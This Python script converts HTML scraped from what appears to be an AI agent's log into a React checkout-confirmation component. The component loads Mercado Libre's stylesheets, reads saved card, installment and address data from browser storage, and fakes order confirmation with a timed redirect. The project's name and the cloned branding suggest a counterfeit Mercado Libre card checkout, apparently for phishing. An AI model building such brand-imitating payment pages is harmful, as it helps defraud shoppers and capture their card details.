import re
import os

log_path = r"C:\Users\igore\.gemini\antigravity\brain\f6a9e7dd-be81-4672-b8df-9d7cbba6a512\.system_generated\logs\overview.txt"

with open(log_path, 'r', encoding='utf-8') as f:
    logs = f.read()

# Find the LAST body block in the logs
matches = re.findall(r'(<body.*?</body>)', logs, re.IGNORECASE | re.DOTALL)
if matches:
    html = matches[-1]
    
    # Convert HTML to JSX standard
    html = html.replace('class="', 'className="')
    html = html.replace('for="', 'htmlFor="')
    html = re.sub(r'<(img|hr|input|br)([^>]*?)(?<!/)>', r'<\1\2 />', html)  # Self closing tags
    
    def style_replacer(match):
        style_str = match.group(1)
        if '[object Object]' in style_str:
            return 'style={{}}'
        
        props = style_str.split(';')
        styles = []
        for prop in props:
            if not prop.strip(): continue
            parts = prop.split(':', 1)
            if len(parts) == 2:
                key = parts[0].strip()
                val = parts[1].strip()
                key_parts = key.split('-')
                key_camel = key_parts[0] + ''.join(x.capitalize() for x in key_parts[1:])
                styles.append(f"{key_camel}: '{val}'")
        return f"style={{{{ {', '.join(styles)} }}}}"

    html = re.sub(r'style="([^"]+)"', style_replacer, html)
    html = html.replace('tabindex=', 'tabIndex=')
    html = html.replace('hidden="hidden"', 'hidden={true}')
    html = html.replace('charset=', 'charSet=')
    html = html.replace('checked=""', 'defaultChecked')
    html = html.replace('brickid=', 'data-brickid=')
    html = html.replace('defaultbricksmap=', 'data-defaultbricksmap=')
    html = html.replace('brick=', 'data-brick=')
    html = html.replace('autocomplete=', 'autoComplete=')
    html = html.replace('autocapitalize=', 'autoCapitalize=')
    html = html.replace('autocorrect=', 'autoCorrect=')
    html = html.replace('spellcheck=', 'spellCheck=')
    html = html.replace('maxlength=', 'maxLength=')
    html = html.replace('<s>', '<s >') # Quick fix for <s> tag issue in previous attempt if any
    
    target_file = r"c:\Users\igore\OneDrive\Área de Trabalho\metarat beta\nova-merchant-hub\src\pages\StoreCheckoutCardConfirmation.tsx"
    
    basic_component = f"""import React, {{ useEffect, useState }} from 'react';
import {{ useNavigate }} from "react-router-dom";
import {{ useStore }} from "@/contexts/StoreContext";
import {{ useI18n }} from "@/contexts/I18nContext";

const StoreCheckoutCardConfirmation = () => {{
  const navigate = useNavigate();
  const {{ cartItems, cartTotal }} = useStore();
  const {{ formatCurrencyParts }} = useI18n();

  const [cardData, setCardData] = useState<any>(null);
  const [installments, setInstallments] = useState<any>(null);
  const [addressData, setAddressData] = useState<any>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {{
      if (cartItems.length === 0) {{
          navigate("/store/cart", {{ replace: true }});
          return;
      }}

      const savedCard = localStorage.getItem('checkout_card_input');
      if (savedCard) try {{ setCardData(JSON.parse(savedCard)); }} catch (e) {{ }}

      const savedInst = localStorage.getItem('checkout_installment_selection');
      if (savedInst) try {{ setInstallments(JSON.parse(savedInst)); }} catch (e) {{ }}

      const savedAddr = localStorage.getItem('checkout_address');
      if (savedAddr) try {{ setAddressData(JSON.parse(savedAddr)); }} catch (e) {{ }}
  }}, [cartItems, navigate]);

  const handleConfirm = () => {{
      setIsSubmitting(true);
      setTimeout(() => {{
          navigate("/store/checkout/confirmation");
      }}, 1200);
  }};

  useEffect(() => {{
    const confirmBtn = document.getElementById('review_footer_confirm_button');
    const confirmBtn2 = document.getElementById('review_price_box_confirm_button');
    
    if (confirmBtn) confirmBtn.onclick = handleConfirm;
    if (confirmBtn2) confirmBtn2.onclick = handleConfirm;
    
    return () => {{
      if (confirmBtn) confirmBtn.onclick = null;
      if (confirmBtn2) confirmBtn2.onclick = null;
    }};
  }}, []);

  return (
    <div className="ml-layout">
      <style>
          {{`
          a#nav-skip-to-main-content {{ display: none !important; }} 
          a#nav-a11y-feedback-link {{ display: none !important; }}
          
          /* Esconder botões base adicionais caso necessário */
          `}}
      </style>
      <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/buyingflow-review-frontend/index.desktop.7d2d8933.css" />
      <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/widgets/6.15.0/modeless-box.css" />
      <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.15.0/mercadolibre/navigation-desktop.css" />
      
{html}
    </div>
  );
}};

export default StoreCheckoutCardConfirmation;
"""

    with open(target_file, 'w', encoding='utf-8') as f:
        f.write(basic_component)
    print("Success! Created robust component with HTML from logs.")
else:
    print("Could not find HTML in logs")
